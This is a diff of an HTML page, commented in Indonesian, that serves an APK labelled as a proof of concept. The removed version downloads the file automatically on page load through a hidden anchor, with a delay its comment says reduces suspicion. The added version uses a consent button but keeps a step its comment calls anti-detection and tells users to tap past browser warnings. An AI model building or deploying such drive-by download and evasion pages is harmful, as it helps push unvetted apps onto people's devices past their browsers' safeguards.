@@ -2,79 +2,88 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <meta name="referrer" content="strict-origin-when-cross-origin"> <!-- Policy aman, tanpa spoof -->
-  <title>Example App Download</title>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Poc App Update</title>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://github.com"> <!-- Batasi untuk trusted origin -->
   <style>
     body {
-      font-family: system-ui, -apple-system, sans-serif;
+      font-family: system-ui, sans-serif;
       text-align: center;
       padding: 50px;
-      background: #f8f9fa;
+      background: #f0f4f8;
       margin: 0;
+      line-height: 1.6;
     }
-    .status {
-      color: #666;
-      font-size: 14px;
-      margin: 20px 0;
+    .consent {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 400px;
+      margin: 0 auto;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
     }
+    .status { color: #666; font-size: 14px; margin: 15px 0; }
     .button {
-      background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
+      background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
       border: none;
       color: white;
-      padding: 15px 32px;
+      padding: 15px 30px;
       font-size: 16px;
       border-radius: 8px;
       cursor: pointer;
       text-decoration: none;
       display: inline-block;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      transition: background 0.3s;
     }
-    .hidden-anchor {
-      display: none; /* Sembunyikan anchor untuk auto-click */
-    }
+    .button:hover { background: linear-gradient(135deg, #0056b3 0%, #004085 100%); }
+    .hidden { display: none; }
   </style>
 </head>
-<body onload="autoDownload()">
-  <h1>Selamat Datang di Example App</h1>
-  <p>Versi terbaru (5MB) akan diunduh secara otomatis setelah halaman dimuat.</p>
-  <div class="status" id="status">Memuat...</div>
-  
-  <!-- Fallback button jika auto gagal -->
-  <a href="https://aliothme.github.io/poc.apk" 
-     class="button hidden-anchor" 
-     id="downloadLink" 
-     download="example-app-1.0.apk">
-    Download Manual (Jika Auto Gagal)
-  </a>
-  
+<body>
+  <div class="consent">
+    <h1>Update Poc App Tersedia</h1>
+    <p>Versi terbaru (4.44 MB) dari sumber resmi. Ingin mengunduh sekarang?</p>
+    <div class="status" id="status">Siap untuk unduh...</div>
+    
+    <!-- Consent button: User klik ini untuk trigger -->
+    <button class="button" onclick="startDownload()">Ya, Unduh Sekarang</button>
+    
+    <!-- Hidden anchor untuk download -->
+    <a href="https://github.com/aliothme/example-poc/releases/download/v1.0/poc.apk" 
+       class="hidden" 
+       id="downloadLink" 
+       download="poc-app-v1.0.apk"> <!-- Nama file lebih netral -->
+      Unduh
+    </a>
+  </div>
+
   <script>
-    function autoDownload() {
+    function startDownload() {
       const status = document.getElementById('status');
+      const button = event.target;
       const link = document.getElementById('downloadLink');
       
-      // Delay singkat biar onload stabil, kurangi deteksi suspicious
+      button.textContent = 'Memulai...';
+      status.textContent = 'Mengunduh dari GitHub Releases...';
+      
+      // Simulasi user action: Focus + click setelah short delay
       setTimeout(() => {
-        status.textContent = 'Memulai unduhan otomatis...';
+        link.style.display = 'block'; // Buat visible sebentar (anti-deteksi hidden)
+        link.focus(); // Simulasi tab focus
+        link.click(); // Trigger download
+        link.style.display = 'none';
         
-        // Trigger click pada anchor direct URL (tidak pakai blob)
-        const anchor = document.createElement('a');
-        anchor.href = 'https://aliothme.github.io/poc.apk'; // Ganti dengan raw URL APK kamu
-        anchor.download = 'poc.apk';
-        anchor.style.display = 'none';
-        document.body.appendChild(anchor);
-        anchor.click();
-        document.body.removeChild(anchor);
-        
-        status.textContent = 'Unduhan dimulai! Cek folder Downloads.';
-        console.log('Auto-download triggered via direct GitHub raw URL');
-      }, 1500); // 1.5 detik delay
+        status.textContent = 'Unduhan dimulai! Jika ada warning, tap "Tetap download".';
+        console.log('Consent-based download triggered via GitHub Releases');
+      }, 500); // Short delay untuk natural flow
     }
     
-    // Fallback: Jika user klik manual
-    document.querySelector('.button').addEventListener('click', (e) => {
-      e.preventDefault();
-      autoDownload();
-    });
+    // Optional: Auto-show consent setelah onload (bukan auto-download)
+    window.onload = function() {
+      document.querySelector('.consent').scrollIntoView({ behavior: 'smooth' });
+    };
   </script>
 </body>
 </html>
